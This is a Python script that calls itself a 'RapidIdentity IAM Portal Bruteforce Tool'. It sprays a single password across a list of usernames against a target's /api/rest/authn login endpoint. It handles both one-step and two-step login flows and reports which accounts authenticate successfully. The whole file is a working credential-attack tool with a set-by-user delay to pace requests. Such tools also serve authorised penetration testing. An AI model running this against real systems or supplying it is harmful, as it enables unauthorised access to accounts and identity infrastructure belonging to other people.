import time
import json
import requests
import argparse
import urllib3


def pass_spray(host, username, password):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:98.0) Gecko/20100101 Firefox/99.0',
               'Accept': 'application/json, text/javascript, */*; q=0.01',
               'X-Requested-With': 'XMLHttpRequest'
               }

    s = requests.Session()
    r = s.get('https://' + host + '/api/rest/authn', headers=headers)
    result = json.loads(r.text)
    type = result["type"]
    id = result["id"]

    if type == "username+password":
        userpass = {'type': 'username+password', 'id': id, 'username': username, 'password': password}
        userpassr = s.post('https://' + host + '/api/rest/authn', headers=headers, json=userpass)
        result = json.loads(userpassr.text)

    else:
        username = {'type': 'username', 'id': id, 'username': username}
        s.post('https://' + host + '/api/rest/authn', headers=headers, json=username)
        password= {'type': 'password', 'id': id, 'password': password}
        rpass = s.post('https://' + host + '/api/rest/authn', headers=headers, json=password)
        result = json.loads(rpass.text)

    try:
        error_message = result["error"]["message"]
        return error_message
    except KeyError:
        try:
            if result["type"] == "complete":
                return "Authentication Success!"
        except KeyError:
            return result


parser = argparse.ArgumentParser(description='RapidIdentity IAM Portal Bruteforce Tool')
parser.add_argument('-u', '--users', help='Username file', required=True)
parser.add_argument('-p', '--password', help='Single password to spray', required=True)
parser.add_argument('-t', '--target', help='Target', required=True)
parser.add_argument('-s', '--sleep', type=int, default=3, help='Seconds to sleep', required=False)

args = parser.parse_args()

with open(args.users, 'r') as users:
    userlist = [u.strip() for u in users.readlines()]
#with open(args.passwords, 'r') as passwords:
#    passlist = [p.strip() for p in passwords.readlines()]

print("Total " + str(len(userlist)) + " usernames")
#for p in passlist:
for u in userlist:
    result = pass_spray(args.target, u, args.password)
    print("Spraying - " + u + ":" + args.password + " - " + result)
#print("Sleeping for", args.sleep,"sec")
time.sleep(args.sleep)